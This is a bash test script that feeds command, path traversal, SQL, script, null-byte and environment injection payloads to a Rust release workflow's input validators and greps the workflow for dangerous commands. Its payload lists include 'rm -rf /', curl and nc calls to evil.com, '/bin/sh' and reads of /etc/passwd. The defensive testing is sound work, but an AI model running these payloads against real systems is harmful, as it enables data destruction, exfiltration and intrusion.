#!/bin/bash

# Security Test Script
# Comprehensive security testing for input validation and injection prevention

set -euo pipefail

# Color codes for output
readonly RED='\033[0;31m'
readonly GREEN='\033[0;32m'
readonly YELLOW='\033[1;33m'
readonly BLUE='\033[0;34m'
readonly PURPLE='\033[0;35m'
readonly NC='\033[0m' # No Color

# Test configuration
readonly SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
readonly SCRIPTS_DIR="$SCRIPT_DIR/scripts"
readonly TEST_DIR="$SCRIPT_DIR/test-results"
readonly TIMESTAMP=$(date +"%Y%m%d_%H%M%S")
readonly LOG_FILE="$TEST_DIR/security_test_log_$TIMESTAMP.log"

# Test counters
TESTS_TOTAL=0
TESTS_PASSED=0
TESTS_FAILED=0
SECURITY_ISSUES=0

# Source validation functions
if [[ -f "$SCRIPTS_DIR/validate-inputs.sh" ]]; then
    source "$SCRIPTS_DIR/validate-inputs.sh"
else
    echo -e "${RED}Error: validate-inputs.sh not found in $SCRIPTS_DIR${NC}"
    exit 1
fi

# Logging function
log() {
    local level="$1"
    shift
    local message="$*"
    local timestamp=$(date '+%Y-%m-%d %H:%M:%S')
    echo "[$timestamp] [$level] $message" | tee -a "$LOG_FILE"
}

# Security issue tracking
security_issue() {
    local test_name="$1"
    local vulnerability="$2"
    ((SECURITY_ISSUES++))
    log "SECURITY" "$test_name - VULNERABILITY: $vulnerability"
    echo -e "${PURPLE}🚨 SECURITY ISSUE: $test_name${NC}"
    echo -e "${PURPLE}   Vulnerability: $vulnerability${NC}"
}

# Test result tracking
test_start() {
    local test_name="$1"
    ((TESTS_TOTAL++))
    log "INFO" "Starting security test: $test_name"
    echo -e "${BLUE}🔒 Security Testing: $test_name${NC}"
}

test_pass() {
    local test_name="$1"
    ((TESTS_PASSED++))
    log "PASS" "$test_name"
    echo -e "${GREEN}✅ SECURE: $test_name${NC}"
}

test_fail() {
    local test_name="$1"
    local error_msg="$2"
    ((TESTS_FAILED++))
    log "FAIL" "$test_name - $error_msg"
    echo -e "${RED}❌ FAIL: $test_name${NC}"
    echo -e "${RED}   Error: $error_msg${NC}"
}

# Command injection test cases
test_command_injection() {
    test_start "Command Injection Prevention"
    
    local injection_payloads=(
        # Basic command injection
        "; rm -rf /"
        "&& curl evil.com"
        "|| wget malicious.com"
        "; cat /etc/passwd"
        "&& nc -l 8080"
        
        # Command substitution
        "\$(whoami)"
        "\$(id)"
        "\$(curl evil.com)"
        "\`id\`"
        "\`rm -rf /tmp\`"
        
        # Pipe and redirection
        "| nc evil.com 8080"
        "> /etc/passwd"
        "< /etc/passwd"
        ">> /var/log/evil"
        
        # Background execution
        "& /bin/sh"
        "& curl evil.com &"
        
        # Environment variable injection
        "\$PATH"
        "\${PATH}"
        "\$HOME/evil"
    )
    
    local vulnerabilities=0
    
    for payload in "${injection_payloads[@]}"; do
        echo -e "${YELLOW}  Testing payload: '${payload}'${NC}"
        
        # Test against binary name validation
        if validate_binary_name "app${payload}" &>/dev/null; then
            security_issue "Binary Name Injection" "Payload accepted: app${payload}"
            ((vulnerabilities++))
        fi
        
        # Test against cargo args validation
        if validate_cargo_args "--release ${payload}" &>/dev/null; then
            security_issue "Cargo Args Injection" "Payload accepted: --release ${payload}"
            ((vulnerabilities++))
        fi
        
        # Test against platform validation
        if validate_platform_name "linux${payload}" &>/dev/null; then
            security_issue "Platform Name Injection" "Payload accepted: linux${payload}"
            ((vulnerabilities++))
        fi
    done
    
    if [[ $vulnerabilities -eq 0 ]]; then
        test_pass "Command Injection Prevention"
    else
        test_fail "Command Injection Prevention" "$vulnerabilities injection vulnerabilities found"
    fi
}

# Path traversal test cases
test_path_traversal() {
    test_start "Path Traversal Prevention"
    
    local traversal_payloads=(
        # Basic traversal
        "../../../etc/passwd"
        "..\\..\\..\\windows\\system32\\config\\sam"
        
        # Encoded traversal
        "%2e%2e/%2e%2e/%2e%2e/etc/passwd"
        "..%2f..%2f..%2fetc%2fpasswd"
        
        # Unicode traversal
        "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd"
        
        # Nested traversal
        "....//....//....//etc//passwd"
        "..../..../..../etc/passwd"
        
        # Absolute paths
        "/etc/passwd"
        "/windows/system32/config/sam"
        "/proc/self/environ"
        
        # Mixed traversal
        "file/../../../etc/passwd"
        "normal/path/../../../secret"
        "./../../etc/passwd"
    )
    
    local temp_dir="$TEST_DIR/temp_path_test_$TIMESTAMP"
    mkdir -p "$temp_dir"
    
    local vulnerabilities=0
    
    for payload in "${traversal_payloads[@]}"; do
        echo -e "${YELLOW}  Testing path: '${payload}'${NC}"
        
        if validate_file_path "$payload" "$temp_dir" &>/dev/null; then
            security_issue "Path Traversal" "Dangerous path accepted: $payload"
            ((vulnerabilities++))
        fi
    done
    
    # Cleanup
    rm -rf "$temp_dir"
    
    if [[ $vulnerabilities -eq 0 ]]; then
        test_pass "Path Traversal Prevention"
    else
        test_fail "Path Traversal Prevention" "$vulnerabilities path traversal vulnerabilities found"
    fi
}

# SQL injection-style attacks (for string validation)
test_sql_injection_patterns() {
    test_start "SQL Injection Pattern Prevention"
    
    local sql_payloads=(
        "'; DROP TABLE users; --"
        "' OR '1'='1"
        "' UNION SELECT * FROM secrets --"
        "'; DELETE FROM data; --"
        "' OR 1=1 --"
        "admin'--"
        "' OR 'x'='x"
    )
    
    local vulnerabilities=0
    
    for payload in "${sql_payloads[@]}"; do
        echo -e "${YELLOW}  Testing SQL pattern: '${payload}'${NC}"
        
        # Test against various validation functions
        if validate_binary_name "app${payload}" &>/dev/null; then
            security_issue "SQL Pattern in Binary Name" "SQL-like pattern accepted: app${payload}"
            ((vulnerabilities++))
        fi
        
        if validate_repository "user/${payload}" &>/dev/null; then
            security_issue "SQL Pattern in Repository" "SQL-like pattern accepted: user/${payload}"
            ((vulnerabilities++))
        fi
    done
    
    if [[ $vulnerabilities -eq 0 ]]; then
        test_pass "SQL Injection Pattern Prevention"
    else
        test_fail "SQL Injection Pattern Prevention" "$vulnerabilities SQL pattern vulnerabilities found"
    fi
}

# Script injection test cases
test_script_injection() {
    test_start "Script Injection Prevention"
    
    local script_payloads=(
        # Bash injection
        "\$(bash)"
        "\$(sh -c 'curl evil.com')"
        
        # Python injection
        "'; import os; os.system('evil'); '"
        "__import__('os').system('evil')"
        
        # Node.js injection
        "'; require('child_process').exec('evil'); '"
        "process.exit(1)"
        
        # Perl injection
        "'; system('evil'); '"
        "eval('evil')"
        
        # Ruby injection
        "'; system('evil'); '"
        "eval('evil')"
        
        # PowerShell injection
        "; Invoke-Expression 'evil'"
        "; Start-Process 'evil'"
    )
    
    local vulnerabilities=0
    
    for payload in "${script_payloads[@]}"; do
        echo -e "${YELLOW}  Testing script payload: '${payload}'${NC}"
        
        # Test against cargo args (most likely injection point)
        if validate_cargo_args "--release ${payload}" &>/dev/null; then
            security_issue "Script Injection" "Script payload accepted: --release ${payload}"
            ((vulnerabilities++))
        fi
    done
    
    if [[ $vulnerabilities -eq 0 ]]; then
        test_pass "Script Injection Prevention"
    else
        test_fail "Script Injection Prevention" "$vulnerabilities script injection vulnerabilities found"
    fi
}

# Buffer overflow test cases
test_buffer_overflow() {
    test_start "Buffer Overflow Prevention"
    
    # Test extremely long inputs
    local long_payloads=(
        "$(printf 'A%.0s' {1..1000})"    # 1000 chars
        "$(printf 'B%.0s' {1..5000})"    # 5000 chars
        "$(printf 'C%.0s' {1..10000})"   # 10000 chars
    )
    
    local vulnerabilities=0
    
    for payload in "${long_payloads[@]}"; do
        local length=${#payload}
        echo -e "${YELLOW}  Testing buffer overflow with ${length} chars${NC}"
        
        # Test against all validation functions
        if validate_binary_name "$payload" &>/dev/null; then
            security_issue "Binary Name Buffer Overflow" "Extremely long input accepted: ${length} chars"
            ((vulnerabilities++))
        fi
        
        if validate_cargo_args "$payload" &>/dev/null; then
            security_issue "Cargo Args Buffer Overflow" "Extremely long input accepted: ${length} chars"
            ((vulnerabilities++))
        fi
        
        if validate_repository "user/$payload" &>/dev/null; then
            security_issue "Repository Buffer Overflow" "Extremely long input accepted: ${length} chars"
            ((vulnerabilities++))
        fi
    done
    
    if [[ $vulnerabilities -eq 0 ]]; then
        test_pass "Buffer Overflow Prevention"
    else
        test_fail "Buffer Overflow Prevention" "$vulnerabilities buffer overflow vulnerabilities found"
    fi
}

# Test for null byte injection
test_null_byte_injection() {
    test_start "Null Byte Injection Prevention"
    
    local null_payloads=(
        $'app\x00evil'
        $'valid\x00; rm -rf /'
        $'normal\x00\x01\x02'
        $'test\x00../../../etc/passwd'
    )
    
    local vulnerabilities=0
    
    for payload in "${null_payloads[@]}"; do
        echo -e "${YELLOW}  Testing null byte payload${NC}"
        
        if validate_binary_name "$payload" &>/dev/null; then
            security_issue "Null Byte Injection" "Null byte payload accepted in binary name"
            ((vulnerabilities++))
        fi
    done
    
    if [[ $vulnerabilities -eq 0 ]]; then
        test_pass "Null Byte Injection Prevention"
    else
        test_fail "Null Byte Injection Prevention" "$vulnerabilities null byte vulnerabilities found"
    fi
}

# Test environment variable injection
test_environment_injection() {
    test_start "Environment Variable Injection Prevention"
    
    local env_payloads=(
        "\$PATH/evil"
        "\${HOME}/malicious"
        "\$USER\$(curl evil.com)"
        "\${SHELL:-/bin/bash}"
        "\$IFS\$9"
    )
    
    local vulnerabilities=0
    
    for payload in "${env_payloads[@]}"; do
        echo -e "${YELLOW}  Testing env payload: '${payload}'${NC}"
        
        if validate_cargo_args "--target $payload" &>/dev/null; then
            security_issue "Environment Variable Injection" "Environment variable payload accepted: $payload"
            ((vulnerabilities++))
        fi
    done
    
    if [[ $vulnerabilities -eq 0 ]]; then
        test_pass "Environment Variable Injection Prevention"
    else
        test_fail "Environment Variable Injection Prevention" "$vulnerabilities environment injection vulnerabilities found"
    fi
}

# Test workflow security in act
test_workflow_security() {
    test_start "Workflow Security Analysis"
    
    # Check for potential security issues in workflow
    local workflow_file=".github/workflows/rust-release.yml"
    local security_warnings=0
    
    if [[ -f "$workflow_file" ]]; then
        # Check for hardcoded secrets (shouldn't find any)
        if grep -q "password\|secret\|token" "$workflow_file" | grep -v "\${{"; then
            security_issue "Hardcoded Secrets" "Potential hardcoded secrets found in workflow"
            ((security_warnings++))
        fi
        
        # Check for dangerous shell commands
        if grep -q "rm -rf\|curl.*|.*sh\|wget.*|.*sh" "$workflow_file"; then
            security_issue "Dangerous Commands" "Potentially dangerous shell commands in workflow"
            ((security_warnings++))
        fi
        
        # Check for eval usage
        if grep -q "eval\|exec" "$workflow_file"; then
            security_issue "Dynamic Execution" "Dynamic code execution found in workflow"
            ((security_warnings++))
        fi
    else
        test_fail "Workflow Security Analysis" "Workflow file not found: $workflow_file"
        return
    fi
    
    if [[ $security_warnings -eq 0 ]]; then
        test_pass "Workflow Security Analysis"
    else
        test_fail "Workflow Security Analysis" "$security_warnings security warnings found"
    fi
}

# Test secrets handling
test_secrets_security() {
    test_start "Secrets Handling Security"
    
    # Create a test secrets file with intentionally insecure content
    local temp_secrets="$TEST_DIR/temp_insecure_secrets_$TIMESTAMP"
    cat > "$temp_secrets" << 'EOF'
GITHUB_TOKEN=ghp_test123
NPM_TOKEN=npm_test456
SECRET_WITH_INJECTION=secret; rm -rf /
EOF
    
    # Test if act properly handles secrets without exposing them
    local act_output
    if act_output=$(act workflow_dispatch \
        --input binary-name="test" \
        --secret-file "$temp_secrets" \
        --dryrun 2>&1); then
        
        # Check if secrets are exposed in output
        if echo "$act_output" | grep -q "ghp_test123\|npm_test456"; then
            security_issue "Secret Exposure" "Secrets exposed in act output"
            test_fail "Secrets Handling Security" "Secrets leaked in output"
        else
            test_pass "Secrets Handling Security"
        fi
    else
        test_fail "Secrets Handling Security" "Failed to run act with secrets file"
    fi
    
    # Cleanup
    rm -f "$temp_secrets"
}

# Generate security report
generate_security_report() {
    echo -e "\n${PURPLE}🛡️ Security Test Report${NC}"
    echo "=================================="
    echo "Total Security Tests: $TESTS_TOTAL"
    echo -e "Passed: ${GREEN}$TESTS_PASSED${NC}"
    echo -e "Failed: ${RED}$TESTS_FAILED${NC}"
    echo -e "Security Issues: ${PURPLE}$SECURITY_ISSUES${NC}"
    
    if [[ $TESTS_TOTAL -gt 0 ]]; then
        echo "Security Score: $(( (TESTS_TOTAL - SECURITY_ISSUES) * 100 / TESTS_TOTAL ))%"
    fi
    
    echo "Log file: $LOG_FILE"
    echo "=================================="
    
    if [[ $SECURITY_ISSUES -eq 0 && $TESTS_FAILED -eq 0 ]]; then
        echo -e "${GREEN}🔒 Security tests passed! No vulnerabilities detected.${NC}"
        return 0
    else
        echo -e "${RED}🚨 Security issues detected! Review the log for details.${NC}"
        if [[ $SECURITY_ISSUES -gt 0 ]]; then
            echo -e "${PURPLE}Critical: $SECURITY_ISSUES security vulnerabilities found${NC}"
        fi
        return 1
    fi
}

# Main security test execution
main() {
    echo -e "${PURPLE}🔒 Starting Security Tests${NC}"
    echo "Timestamp: $(date)"
    echo "Testing input validation security"
    echo "Log file: $LOG_FILE"
    echo ""
    
    # Create test directory
    mkdir -p "$TEST_DIR"
    
    # Run security test suites
    echo -e "\n${PURPLE}🛡️ Running Security Test Suites${NC}"
    echo "=================================="
    
    test_command_injection
    test_path_traversal
    test_sql_injection_patterns
    test_script_injection
    test_buffer_overflow
    test_null_byte_injection
    test_environment_injection
    test_workflow_security
    test_secrets_security
    
    # Generate final security report
    echo ""
    generate_security_report
}

# Script entry point
if [[ "${BASH_SOURCE[0]}" == "${0}" ]]; then
    main "$@"
fi